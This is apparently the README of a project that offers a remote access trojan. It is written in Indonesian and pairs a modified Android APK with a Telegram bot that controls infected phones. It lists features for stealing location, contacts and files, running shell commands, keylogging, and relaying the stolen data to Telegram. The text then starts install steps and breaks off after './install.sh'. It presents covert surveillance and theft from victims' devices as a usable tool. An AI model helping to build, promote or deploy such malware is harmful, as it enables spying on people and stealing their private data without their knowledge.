# RAT Telegram Bot & APK Trojan

## Deskripsi
Proyek ini adalah bot Telegram yang memungkinkan Anda mengendalikan perangkat yang terinfeksi menggunakan APK Trojan yang dimodifikasi. Bot ini memungkinkan pengendalian perangkat secara remote, pengambilan data sensitif, dan pengiriman informasi ke Telegram.

## Struktur Proyek
1. **bot/** - Folder yang berisi semua file terkait dengan bot Telegram, termasuk skrip dan pengaturan.
2. **assets/** - Folder untuk menyimpan asset, seperti ikon untuk APK.
3. **output/** - Folder untuk menyimpan APK yang telah dimodifikasi dan dibangun.
4. **README.md** - Dokumentasi penggunaan proyek.

## Fitur Bot Telegram
- Mengirim perintah untuk mengambil lokasi, kontak, file, dan lebih banyak lagi dari perangkat yang terinfeksi.
- Menjalankan perintah shell dan mendapatkan hasilnya.
- Memantau aktivitas keylogger.
- Mengirimkan informasi ke Telegram dalam format yang bisa dipantau.

## Cara Menggunakan

### 1. Menginstal Dependensi
Jalankan `install.sh` untuk menginstal semua dependensi yang dibutuhkan di Termux atau VPS.

```bash
./install.sh